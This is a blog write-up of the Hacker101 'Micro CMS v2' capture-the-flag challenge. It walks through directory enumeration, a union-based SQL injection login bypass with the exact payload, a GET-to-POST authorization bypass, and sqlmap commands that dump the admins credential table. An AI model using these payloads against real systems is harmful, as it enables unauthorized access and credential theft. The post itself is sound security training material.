<!doctype html><html lang=en dir=auto><head><meta charset=utf-8><meta http-equiv=x-ua-compatible content="IE=edge"><meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no"><meta name=robots content="index, follow"><title>Hacker101 - Micro CMS_v2 | d0rksec</title><meta name=keywords content="Hacker101,SQL Injection,sqlmap"><meta name=description content="Improved CMS with password authentication"><meta name=author content><link rel=canonical href=https://d0rksec.github.io/writeups/h101/micro-cms_v2/><link crossorigin=anonymous href=/assets/css/stylesheet.aa8a0c4802ee570e352291e58d608e6b99d48ef678aa4be907095a212e60d6e9.css integrity="sha256-qooMSALuVw41IpHljWCOa5nUjvZ4qkvpBwlaIS5g1uk=" rel="preload stylesheet" as=style><script defer crossorigin=anonymous src=/assets/js/highlight.f413e19d0714851f6474e7ee9632408e58ac146fbdbe62747134bea2fa3415e0.js integrity="sha256-9BPhnQcUhR9kdOfuljJAjlisFG+9vmJ0cTS+ovo0FeA=" onload=hljs.initHighlightingOnLoad()></script>
<link rel=icon href=https://d0rksec.github.io/favicon.ico><link rel=icon type=image/png sizes=16x16 href=https://d0rksec.github.io/favicon-16x16.png><link rel=icon type=image/png sizes=32x32 href=https://d0rksec.github.io/favicon-32x32.png><link rel=apple-touch-icon href=https://d0rksec.github.io/apple-touch-icon.png><link rel=mask-icon href=https://d0rksec.github.io/safari-pinned-tab.svg><meta name=theme-color content="#2e2e33"><meta name=msapplication-TileColor content="#2e2e33"><noscript><style>#theme-toggle,.top-link{display:none}</style></noscript><meta property="og:title" content="Hacker101 - Micro CMS_v2"><meta property="og:description" content="Improved CMS with password authentication"><meta property="og:type" content="article"><meta property="og:url" content="https://d0rksec.github.io/writeups/h101/micro-cms_v2/"><meta property="article:section" content="writeups"><meta property="article:published_time" content="2022-10-16T17:04:39+02:00"><meta property="article:modified_time" content="2022-10-16T17:04:39+02:00"><meta name=twitter:card content="summary"><meta name=twitter:title content="Hacker101 - Micro CMS_v2"><meta name=twitter:description content="Improved CMS with password authentication"><script type=application/ld+json>{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"Writeups","item":"https://d0rksec.github.io/writeups/"},{"@type":"ListItem","position":2,"name":"Hacker101","item":"https://d0rksec.github.io/writeups/h101/"},{"@type":"ListItem","position":3,"name":"Hacker101 - Micro CMS_v2","item":"https://d0rksec.github.io/writeups/h101/micro-cms_v2/"}]}</script><script type=application/ld+json>{"@context":"https://schema.org","@type":"BlogPosting","headline":"Hacker101 - Micro CMS_v2","name":"Hacker101 - Micro CMS_v2","description":"Improved CMS with password authentication","keywords":["Hacker101","SQL Injection","sqlmap"],"articleBody":"What A CMS with Python backend, prone for SQL injection.\nDifficulty: Moderate\nFlag0 Hint0: Regular users can only see public pages Start with wandering around the site, visiting all available pages to feed site map in Burp.\nAs we can see on Changelog page (/page/1), user authentication has been implemented, so by default, only admins can add or edit pages.\nAs a regular user, we can visit (load without authenticating on /login) the following pages:\n/home /login /page/1 /page/2 Can’t hurt, if we run gobuster and dirb too, right? Only /logout found by both in addition to what we had before.\ngobuster dir -u https://IAMSOSORRY.ctf.hacker101.com/ -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-small.txt -z -t 100 Let’s run dirb too.\ndirb https://IAMSOSORRY.ctf.hacker101.com/ It made me a bit upset that dirb did not found anything under /page, so I quickly modified my wordlist-generator script (used in Postbook) to create an index list [1-100]. Running dirb with this wordlist on /page, revealed /page/3 which is Forbidden.\ndirb https://IAMSOSORRY.ctf.hacker101.com/page/ ~/scripts/numbers100.txt Hint1: Getting admin access might require a more perfect union The hint tells us that the login page is vulnerable for SQL Injection. Starting with a basic payload (') in Username field generated an error message.\nTraceback (most recent call last): File \"./main.py\", line 145, in do_login if cur.execute('SELECT password FROM admins WHERE username=\\'%s\\'' % request.form['username'].replace('%', '%%')) == 0: File \"/usr/local/lib/python2.7/site-packages/MySQLdb/cursors.py\", line 255, in execute self.errorhandler(self, exc, value) File \"/usr/local/lib/python2.7/site-packages/MySQLdb/connections.py\", line 50, in defaulterrorhandler raise errorvalue ProgrammingError: (1064, \"You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near ';'' at line 1\") Bad practice, if clients can see the error message details due to error reporting is active on a live page. For us, it suggests that we’re facing with a MySQL database server in the backend.\nHere you can see a complete list of payloads to be used against MySQL database.\nFollowing the hint, we should focus on Union Based section of the page. Few documents worth a look before continuing:\nthis gem from PortSwigger, Invicti's SQL Injection Cheat Sheet, Advanced SQL Injection: Union based from VK9 Security, Let’s determine how many columns are being returned from the original query with\n' order by 1;\n' order by 2;\n' order by 3;\nThe first query results an “Unknown user” message, the others end up with error details. We need only one column.\nIf we try with\n' union select null;\n' union select null,null; ' union select null,null,null;\nas Name, we can see, that the first union query throws an “Invalid password”, the others give us the error details.\nLook at the error message again. The query behind the scenes is\nSELECT password FROM admins WHERE username='[username field]' AND password='[password field]'\nOur Union-based payload will replace the second part of the original query, from the username’s closing ', something like this:\nSELECT password FROM admins WHERE username=' [payload]\nAs we need only one column, let’s set a fix value for password that we will provide in the password field (no username needed):\nSELECT password FROM admins WHERE username=’ ' UNION SELECT '123' AS password#\nUsername: ' UNION SELECT '123' AS password# #you don’t need uppercase letters..\nPassword: 123\nHere you can see a more detailed answer on why/how above query works.\nIf you catch the request in Burp, you’ll see this:\nusername=%27+union+select+%27123%27+as+password%23\u0026password=123 Fantastic, we’re in:\nHint2: Knowing the password is cool, but there are other approaches that might be easier After logon, an additional page is added to the links: /page/3, which was forbidden before.\nThe page reveals the first FLAG.\nAlternatively, we can also reveal this FLAG with sqlmap, when fetching pages table:\nsqlmap -r ~/h101/micro-cms_v2/login.txt -D level2 -T pages --dump --random-agent --threads 10 See more details for sqlmap in Flag2.\nFlag1 Hint0: What actions could you perform as a regular user on the last level, which you can’t now? We were able to create and edit pages. On this level, we have to logon first.\nHint1: Just because request fails with one method doesn’t mean it will fail with a different method When it comes to changing request method, our usual friends will be Burp and cURL.\nWith Burp, we can intercept the request and replace GET with POST.\ncURL’s default request method is (also) GET. We can change request method to POST with -X POST.\nHint2: Different requests often have different required authorization Burp (intercept the request):\ncURL:\nChange the request method from GET to POST.\nBurp:\nAnother FLAG.\ncURL:\nFlag2 Hint0: Credentials are secret, flags are secret. Coincidence? We already know that the login fields are vulnerable for injection, but an SQLi challenge wouldn’t be complete without using sqlmap - also, there is much to learn even from it’s output.\nFirst, I’ve saved the GET request with Burp Intercept as login.txt (username=user and password=pass).\nLet’s see how sqlmap is listing databases.\nsqlmap -r ~/h101/micro-cms_v2/login.txt --dbs --random-agent --threads 10 We have the database name (level2), now get the tables with:\nsqlmap -r ~/h101/micro-cms_v2/login.txt -D level2 --tables --random-agent --threads 10 Let’s dump admins table.\nsqlmap -r ~/h101/micro-cms_v2/login.txt -D level2 -T admins --dump --random-agent --threads 10 Using the credentials above for login, we see the third FLAG.\nTakeaway(s) Use “Incorrect username and/or password” instead revealing which of the two fields has invalid value Try changing request method between GET and POST Don’t rely on automated tools, understand what they are doing Experience with different tools for the same task ","wordCount":"908","inLanguage":"en","datePublished":"2022-10-16T17:04:39+02:00","dateModified":"2022-10-16T17:04:39+02:00","mainEntityOfPage":{"@type":"WebPage","@id":"https://d0rksec.github.io/writeups/h101/micro-cms_v2/"},"publisher":{"@type":"Organization","name":"d0rksec","logo":{"@type":"ImageObject","url":"https://d0rksec.github.io/favicon.ico"}}}</script></head><body class=dark id=top><script>localStorage.getItem("pref-theme")==="light"&&document.body.classList.remove("dark")</script><header class=header><nav class=nav><div class=logo><a href=https://d0rksec.github.io/ accesskey=h title="d0rksec (Alt + H)">d0rksec</a><div class=logo-switches><button id=theme-toggle accesskey=t title="(Alt + T)"><svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12.79A9 9 0 1111.21 3 7 7 0 0021 12.79z"/></svg><svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="5"/><line x1="12" y1="1" x2="12" y2="3"/><line x1="12" y1="21" x2="12" y2="23"/><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"/><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"/><line x1="1" y1="12" x2="3" y2="12"/><line x1="21" y1="12" x2="23" y2="12"/><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"/><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"/></svg></button></div></div><ul id=menu><li><a href=https://d0rksec.github.io/categories/ title=categories><span>categories</span></a></li><li><a href=https://d0rksec.github.io/tags/ title=tags><span>tags</span></a></li><li><a href=https://d0rksec.github.io/search/ title="search (Alt + /)" accesskey=/><span>search</span></a></li><li><a href=https://d0rksec.github.io/archives/ title=archives><span>archives</span></a></li><li><a href=https://d0rksec.github.io/about title=about><span>about</span></a></li></ul></nav></header><main class=main><article class=post-single><header class=post-header><div class=breadcrumbs><a href=https://d0rksec.github.io/>Home</a>&nbsp;»&nbsp;<a href=https://d0rksec.github.io/writeups/>Writeups</a>&nbsp;»&nbsp;<a href=https://d0rksec.github.io/writeups/h101/>Hacker101</a></div><h1 class=post-title>Hacker101 - Micro CMS_v2</h1><div class=post-meta><span title='2022-10-16 17:04:39 +0200 +0200'>October 16, 2022</span>&nbsp;·&nbsp;5 min</div></header><div class=toc><details><summary accesskey=c title="(Alt + C)"><span class=details>On this page</span></summary><div class=inner><ul><li><a href=#what aria-label=What>What</a></li><li><a href=#flag0 aria-label=Flag0>Flag0</a><ul><li><a href=#hint0-regular-users-can-only-see-public-pages aria-label="Hint0: Regular users can only see public pages">Hint0: Regular users can only see public pages</a></li><li><a href=#hint1-getting-admin-access-might-require-a-more-perfect-union aria-label="Hint1: Getting admin access might require a more perfect union">Hint1: Getting admin access might require a more perfect union</a></li><li><a href=#hint2-knowing-the-password-is-cool-but-there-are-other-approaches-that-might-be-easier aria-label="Hint2: Knowing the password is cool, but there are other approaches that might be easier">Hint2: Knowing the password is cool, but there are other approaches that might be easier</a></li></ul></li><li><a href=#flag1 aria-label=Flag1>Flag1</a><ul><li><a href=#hint0-what-actions-could-you-perform-as-a-regular-user-on-the-last-level-which-you-cant-now aria-label="Hint0: What actions could you perform as a regular user on the last level, which you can&amp;rsquo;t now?">Hint0: What actions could you perform as a regular user on the last level, which you can&rsquo;t now?</a></li><li><a href=#hint1-just-because-request-fails-with-one-method-doesnt-mean-it-will-fail-with-a-different-method aria-label="Hint1: Just because request fails with one method doesn&amp;rsquo;t mean it will fail with a different method">Hint1: Just because request fails with one method doesn&rsquo;t mean it will fail with a different method</a></li><li><a href=#hint2-different-requests-often-have-different-required-authorization aria-label="Hint2: Different requests often have different required authorization">Hint2: Different requests often have different required authorization</a></li></ul></li><li><a href=#flag2 aria-label=Flag2>Flag2</a><ul><li><a href=#hint0-credentials-are-secret-flags-are-secret-coincidence aria-label="Hint0: Credentials are secret, flags are secret. Coincidence?">Hint0: Credentials are secret, flags are secret. Coincidence?</a></li></ul></li><li><a href=#takeaways aria-label=Takeaway(s)>Takeaway(s)</a></li></ul></div></details></div><div class=post-content><h3 id=what>What<a hidden class=anchor aria-hidden=true href=#what>#</a></h3><p>A CMS with Python backend, prone for SQL injection.</p><p><img loading=lazy src=./Micro-CMS_v2-home.png alt="Miro-CMS v2 Home"></p><p>Difficulty: Moderate</p><h3 id=flag0>Flag0<a hidden class=anchor aria-hidden=true href=#flag0>#</a></h3><h4 id=hint0-regular-users-can-only-see-public-pages>Hint0: Regular users can only see public pages<a hidden class=anchor aria-hidden=true href=#hint0-regular-users-can-only-see-public-pages>#</a></h4><p>Start with wandering around the site, visiting all available pages to feed site map in Burp.</p><p>As we can see on Changelog page (<code>/page/1</code>), user authentication has been implemented, so by default, only admins can add or edit pages.</p><p>As a regular user, we can visit (load without authenticating on <code>/login</code>) the following pages:</p><p><img loading=lazy src=./flag0/Micro-CMS_v2-F0-H0-1-sitemap-regular-user.png alt="sitemap for regular user"></p><ul><li><code>/home</code></li><li><code>/login</code></li><li><code>/page/1</code></li><li><code>/page/2</code></li></ul><p>Can&rsquo;t hurt, if we run gobuster and dirb too, right? Only <code>/logout</code> found by both in addition to what we had before.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>gobuster dir -u https://IAMSOSORRY.ctf.hacker101.com/ -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-small.txt -z -t <span style=color:#ae81ff>100</span>
</span></span></code></pre></div><p><img loading=lazy src=./flag0/Micro-CMS_v2-F0-H0-2-gobuster.png alt=gobuster></p><p>Let&rsquo;s run dirb too.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>dirb https://IAMSOSORRY.ctf.hacker101.com/
</span></span></code></pre></div><p><img loading=lazy src=./flag0/Micro-CMS_v2-F0-H0-3-dirb.png alt=dirb></p><p>It made me a bit upset that dirb did not found anything under <code>/page</code>, so I quickly modified my wordlist-generator script (used in <a href=/writeups/h101/postbook/#hint0-189--5>Postbook</a>) to create an index list [1-100]. Running dirb with this wordlist on <code>/page</code>, revealed <code>/page/3</code> which is Forbidden.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>dirb https://IAMSOSORRY.ctf.hacker101.com/page/ ~/scripts/numbers100.txt
</span></span></code></pre></div><p><img loading=lazy src=./flag0/Micro-CMS_v2-F0-H0-4-dirb-with-wordlist.png alt="dirb with wordlist"></p><p><img loading=lazy src=./flag0/Micro-CMS_v2-F0-H0-5-page3-forbidden.png alt="/page/3 forbidden"></p><h4 id=hint1-getting-admin-access-might-require-a-more-perfect-union>Hint1: Getting admin access might require a more perfect union<a hidden class=anchor aria-hidden=true href=#hint1-getting-admin-access-might-require-a-more-perfect-union>#</a></h4><p>The hint tells us that the login page is vulnerable for SQL Injection. Starting with a basic payload (<code>'</code>) in Username field generated an error message.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span>Traceback (most recent call last):
</span></span><span style=display:flex><span>  File <span style=color:#e6db74>&#34;./main.py&#34;</span>, line <span style=color:#ae81ff>145</span>, <span style=color:#f92672>in</span> do_login
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> cur<span style=color:#f92672>.</span>execute(<span style=color:#e6db74>&#39;SELECT password FROM admins WHERE username=</span><span style=color:#ae81ff>\&#39;</span><span style=color:#e6db74>%s</span><span style=color:#ae81ff>\&#39;</span><span style=color:#e6db74>&#39;</span> <span style=color:#f92672>%</span> request<span style=color:#f92672>.</span>form[<span style=color:#e6db74>&#39;username&#39;</span>]<span style=color:#f92672>.</span>replace(<span style=color:#e6db74>&#39;%&#39;</span>, <span style=color:#e6db74>&#39;</span><span style=color:#e6db74>%%</span><span style=color:#e6db74>&#39;</span>)) <span style=color:#f92672>==</span> <span style=color:#ae81ff>0</span>:
</span></span><span style=display:flex><span>  File <span style=color:#e6db74>&#34;/usr/local/lib/python2.7/site-packages/MySQLdb/cursors.py&#34;</span>, line <span style=color:#ae81ff>255</span>, <span style=color:#f92672>in</span> execute
</span></span><span style=display:flex><span>    self<span style=color:#f92672>.</span>errorhandler(self, exc, value)
</span></span><span style=display:flex><span>  File <span style=color:#e6db74>&#34;/usr/local/lib/python2.7/site-packages/MySQLdb/connections.py&#34;</span>, line <span style=color:#ae81ff>50</span>, <span style=color:#f92672>in</span> defaulterrorhandler
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>raise</span> errorvalue
</span></span><span style=display:flex><span>ProgrammingError: (<span style=color:#ae81ff>1064</span>, <span style=color:#e6db74>&#34;You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near &#39;;&#39;&#39; at line 1&#34;</span>)
</span></span></code></pre></div><p>Bad practice, if clients can see the error message details due to <a href=https://www.php.net/manual/en/function.error-reporting.php target=_blank>error reporting</a> is active on a live page. For us, it suggests that we&rsquo;re facing with a MySQL database server in the backend.</p><p><a href=https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/MySQL%20Injection.md target=_blank>Here</a> you can see a complete list of payloads to be used against MySQL database.</p><p>Following the hint, we should focus on Union Based section of the page.
Few documents worth a look before continuing:</p><ul><li><a href=https://portswigger.net/web-security/sql-injection/union-attacks target=_blank>this gem</a> from PortSwigger,</li><li><a href=https://www.invicti.com/blog/web-security/sql-injection-cheat-sheet/ target=_blank>Invicti's SQL Injection Cheat Sheet</a>,</li><li><a href=https://vk9-sec.com/advanced-sql-injection-union-based/ target=_blank>Advanced SQL Injection: Union based</a> from VK9 Security,</li></ul><p>Let&rsquo;s determine how many columns are being returned from the original query with</p><p><code>' order by 1;</code><br><code>' order by 2;</code><br><code>' order by 3;</code></p><p>The first query results an &ldquo;Unknown user&rdquo; message, the others end up with error details. We need only one column.</p><p>If we try with</p><p><code>' union select null;</code><br><code>' union select null,null;</code>
<code>' union select null,null,null;</code></p><p>as Name, we can see, that the first union query throws an &ldquo;Invalid password&rdquo;, the others give us the error details.</p><p>Look at the error message again. The query behind the scenes is</p><p><code>SELECT password FROM admins WHERE username='[username field]' AND password='[password field]'</code></p><p>Our Union-based payload will replace the second part of the original query, from the username&rsquo;s closing <code>'</code>, something like this:</p><p><code>SELECT password FROM admins WHERE username='</code> [payload]</p><p>As we need only one column, let&rsquo;s set a fix value for password that we will provide in the password field (no username needed):</p><p>SELECT password FROM admins WHERE username=&rsquo; <code>' UNION SELECT '123' AS password#</code></p><p>Username: <code>' UNION SELECT '123' AS password#</code> #you don&rsquo;t need uppercase letters..</p><p>Password: <code>123</code></p><p><a href=https://security.stackexchange.com/questions/219121/how-does-this-sqli-statement-work target=_blank>Here</a> you can see a more detailed answer on why/how above query works.</p><p>If you catch the request in Burp, you&rsquo;ll see this:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>username<span style=color:#f92672>=</span>%27+union+select+%27123%27+as+password%23&amp;password<span style=color:#f92672>=</span><span style=color:#ae81ff>123</span>
</span></span></code></pre></div><p>Fantastic, we&rsquo;re in:</p><p><img loading=lazy src=./flag0/Micro-CMS_v2-F0-H1-0-logged-in.png alt="Logged in"></p><h4 id=hint2-knowing-the-password-is-cool-but-there-are-other-approaches-that-might-be-easier>Hint2: Knowing the password is cool, but there are other approaches that might be easier<a hidden class=anchor aria-hidden=true href=#hint2-knowing-the-password-is-cool-but-there-are-other-approaches-that-might-be-easier>#</a></h4><p>After logon, an additional page is added to the links: <code>/page/3</code>, which was forbidden before.</p><p><img loading=lazy src=./flag0/Micro-CMS_v2-F0-H2-0-home-after-logon.png alt="home after logon"></p><p>The page reveals the first FLAG.</p><p><img loading=lazy src=./flag0/Micro-CMS_v2-F0-H2-1-FLAG.png alt=FLAG></p><p>Alternatively, we can also reveal this FLAG with sqlmap, when fetching pages table:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>sqlmap -r ~/h101/micro-cms_v2/login.txt -D level2 -T pages --dump --random-agent --threads <span style=color:#ae81ff>10</span>
</span></span></code></pre></div><p><img loading=lazy src=./flag0/Micro-CMS_v2-F0-H2-2-sqlmap-pages-FLAG.png alt="sqlmap pages FLAG"></p><p>See more details for sqlmap in <a href=#flag2>Flag2</a>.</p><h3 id=flag1>Flag1<a hidden class=anchor aria-hidden=true href=#flag1>#</a></h3><h4 id=hint0-what-actions-could-you-perform-as-a-regular-user-on-the-last-level-which-you-cant-now>Hint0: What actions could you perform as a regular user on the last level, which you can&rsquo;t now?<a hidden class=anchor aria-hidden=true href=#hint0-what-actions-could-you-perform-as-a-regular-user-on-the-last-level-which-you-cant-now>#</a></h4><p>We were able to create and edit pages. On this level, we have to logon first.</p><h4 id=hint1-just-because-request-fails-with-one-method-doesnt-mean-it-will-fail-with-a-different-method>Hint1: Just because request fails with one method doesn&rsquo;t mean it will fail with a different method<a hidden class=anchor aria-hidden=true href=#hint1-just-because-request-fails-with-one-method-doesnt-mean-it-will-fail-with-a-different-method>#</a></h4><p>When it comes to changing request method, our usual friends will be Burp and <a href=https://curl.se/docs/httpscripting.html target=_blank>cURL</a>.</p><p>With Burp, we can intercept the request and replace <code>GET</code> with <code>POST</code>.</p><p>cURL&rsquo;s default request method is (also) <code>GET</code>. We can change request method to POST with <code>-X POST</code>.</p><h4 id=hint2-different-requests-often-have-different-required-authorization>Hint2: Different requests often have different required authorization<a hidden class=anchor aria-hidden=true href=#hint2-different-requests-often-have-different-required-authorization>#</a></h4><p>Burp (intercept the request):</p><p><img loading=lazy src=./flag1/Micro-CMS_v2-F1-H2-0-GET-burp.png alt="GET Burp"></p><p>cURL:</p><p><img loading=lazy src=./flag1/Micro-CMS_v2-F1-H2-1-GET-curl.png alt="GET cURL"></p><p>Change the request method from GET to POST.</p><p>Burp:</p><p><img loading=lazy src=./flag1/Micro-CMS_v2-F1-H2-2-POST-burp.png alt="POST Burp"></p><p>Another FLAG.</p><p><img loading=lazy src=./flag1/Micro-CMS_v2-F1-H2-3-FLAG.png alt=FLAG></p><p>cURL:</p><p><img loading=lazy src=./flag1/Micro-CMS_v2-F1-H2-4-POST-curl.png alt="POST cURL"></p><h3 id=flag2>Flag2<a hidden class=anchor aria-hidden=true href=#flag2>#</a></h3><h4 id=hint0-credentials-are-secret-flags-are-secret-coincidence>Hint0: Credentials are secret, flags are secret. Coincidence?<a hidden class=anchor aria-hidden=true href=#hint0-credentials-are-secret-flags-are-secret-coincidence>#</a></h4><p>We already know that the login fields are vulnerable for injection, but an SQLi challenge wouldn&rsquo;t be complete without using <a href=https://github.com/sqlmapproject/sqlmap target=_blank>sqlmap</a> - also, there is much to learn even from it&rsquo;s output.</p><p>First, I&rsquo;ve saved the GET request with Burp Intercept as login.txt (username=user and password=pass).</p><p><img loading=lazy src=./flag2/Micro-CMS_v2-F2-H0-0-save-login-request.png alt="save login request"></p><p>Let&rsquo;s see how sqlmap is listing databases.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>sqlmap -r ~/h101/micro-cms_v2/login.txt --dbs --random-agent --threads <span style=color:#ae81ff>10</span>
</span></span></code></pre></div><p><img loading=lazy src=./flag2/Micro-CMS_v2-F2-H0-1-sqlmap-databases.png alt="sqlmap databases"></p><p>We have the database name (level2), now get the tables with:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>sqlmap -r ~/h101/micro-cms_v2/login.txt -D level2 --tables --random-agent --threads <span style=color:#ae81ff>10</span>
</span></span></code></pre></div><p><img loading=lazy src=./flag2/Micro-CMS_v2-F2-H0-2-sqlmap-tables.png alt="sqlmap tables"></p><p>Let&rsquo;s dump admins table.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>sqlmap -r ~/h101/micro-cms_v2/login.txt -D level2 -T admins --dump --random-agent --threads <span style=color:#ae81ff>10</span>
</span></span></code></pre></div><p><img loading=lazy src=./flag2/Micro-CMS_v2-F2-H0-3-sqlmap-dump-admins.png alt="sqlmap dump admins"></p><p>Using the credentials above for login, we see the third FLAG.</p><p><img loading=lazy src=./flag2/Micro-CMS_v2-F2-H0-4-FLAG.png alt=FLAG></p><h3 id=takeaways>Takeaway(s)<a hidden class=anchor aria-hidden=true href=#takeaways>#</a></h3><ul><li>Use &ldquo;Incorrect username and/or password&rdquo; instead revealing which of the two fields has invalid value</li><li>Try changing request method between GET and POST</li><li>Don&rsquo;t rely on automated tools, understand what they are doing</li><li>Experience with different tools for the same task</li></ul></div><footer class=post-footer><ul class=post-tags><li><a href=https://d0rksec.github.io/tags/hacker101/>Hacker101</a></li><li><a href=https://d0rksec.github.io/tags/sql-injection/>SQL Injection</a></li><li><a href=https://d0rksec.github.io/tags/sqlmap/>sqlmap</a></li></ul><nav class=paginav><a class=prev href=https://d0rksec.github.io/writeups/h101/photo_gallery/><span class=title>« Prev</span><br><span>Hacker101 - Photo Gallery</span></a>
<a class=next href=https://d0rksec.github.io/writeups/h101/petshop_pro/><span class=title>Next »</span><br><span>Hacker101 - Petshop Pro</span></a></nav><div class=share-buttons><a target=_blank rel="noopener noreferrer" aria-label="share Hacker101 - Micro CMS_v2 on twitter" href="https://twitter.com/intent/tweet/?text=Hacker101%20-%20Micro%20CMS_v2&url=https%3a%2f%2fd0rksec.github.io%2fwriteups%2fh101%2fmicro-cms_v2%2f&hashtags=Hacker101%2cSQLInjection%2csqlmap"><svg viewBox="0 0 512 512"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zM195.519 424.544c135.939.0 210.268-112.643 210.268-210.268.0-3.218.0-6.437-.153-9.502 14.406-10.421 26.973-23.448 36.935-38.314-13.18 5.824-27.433 9.809-42.452 11.648 15.326-9.196 26.973-23.602 32.49-40.92-14.252 8.429-30.038 14.56-46.896 17.931-13.487-14.406-32.644-23.295-53.946-23.295-40.767.0-73.87 33.104-73.87 73.87.0 5.824.613 11.494 1.992 16.858-61.456-3.065-115.862-32.49-152.337-77.241-6.284 10.881-9.962 23.601-9.962 37.088.0 25.594 13.027 48.276 32.95 61.456-12.107-.307-23.448-3.678-33.41-9.196v.92c0 35.862 25.441 65.594 59.311 72.49-6.13 1.686-12.72 2.606-19.464 2.606-4.751.0-9.348-.46-13.946-1.38 9.349 29.426 36.628 50.728 68.965 51.341-25.287 19.771-57.164 31.571-91.8 31.571-5.977.0-11.801-.306-17.625-1.073 32.337 21.15 71.264 33.41 112.95 33.41z"/></svg></a><a target=_blank rel="noopener noreferrer" aria-label="share Hacker101 - Micro CMS_v2 on linkedin" href="https://www.linkedin.com/shareArticle?mini=true&url=https%3a%2f%2fd0rksec.github.io%2fwriteups%2fh101%2fmicro-cms_v2%2f&title=Hacker101%20-%20Micro%20CMS_v2&summary=Hacker101%20-%20Micro%20CMS_v2&source=https%3a%2f%2fd0rksec.github.io%2fwriteups%2fh101%2fmicro-cms_v2%2f"><svg viewBox="0 0 512 512"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zM160.461 423.278V197.561h-75.04v225.717h75.04zm270.539.0V293.839c0-69.333-37.018-101.586-86.381-101.586-39.804.0-57.634 21.891-67.617 37.266v-31.958h-75.021c.995 21.181.0 225.717.0 225.717h75.02V297.222c0-6.748.486-13.492 2.474-18.315 5.414-13.475 17.767-27.434 38.494-27.434 27.135.0 38.007 20.707 38.007 51.037v120.768H431zM123.448 88.722C97.774 88.722 81 105.601 81 127.724c0 21.658 16.264 39.002 41.455 39.002h.484c26.165.0 42.452-17.344 42.452-39.002-.485-22.092-16.241-38.954-41.943-39.002z"/></svg></a><a target=_blank rel="noopener noreferrer" aria-label="share Hacker101 - Micro CMS_v2 on reddit" href="https://reddit.com/submit?url=https%3a%2f%2fd0rksec.github.io%2fwriteups%2fh101%2fmicro-cms_v2%2f&title=Hacker101%20-%20Micro%20CMS_v2"><svg viewBox="0 0 512 512"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zM446 265.638c0-22.964-18.616-41.58-41.58-41.58-11.211.0-21.361 4.457-28.841 11.666-28.424-20.508-67.586-33.757-111.204-35.278l18.941-89.121 61.884 13.157c.756 15.734 13.642 28.29 29.56 28.29 16.407.0 29.706-13.299 29.706-29.701.0-16.403-13.299-29.702-29.706-29.702-11.666.0-21.657 6.792-26.515 16.578l-69.105-14.69c-1.922-.418-3.939-.042-5.585 1.036-1.658 1.073-2.811 2.761-3.224 4.686l-21.152 99.438c-44.258 1.228-84.046 14.494-112.837 35.232-7.468-7.164-17.589-11.591-28.757-11.591-22.965.0-41.585 18.616-41.585 41.58.0 16.896 10.095 31.41 24.568 37.918-.639 4.135-.99 8.328-.99 12.576.0 63.977 74.469 115.836 166.33 115.836s166.334-51.859 166.334-115.836c0-4.218-.347-8.387-.977-12.493 14.564-6.47 24.735-21.034 24.735-38.001zM326.526 373.831c-20.27 20.241-59.115 21.816-70.534 21.816-11.428.0-50.277-1.575-70.522-21.82-3.007-3.008-3.007-7.882.0-10.889 3.003-2.999 7.882-3.003 10.885.0 12.777 12.781 40.11 17.317 59.637 17.317 19.522.0 46.86-4.536 59.657-17.321 3.016-2.999 7.886-2.995 10.885.008 3.008 3.011 3.003 7.882-.008 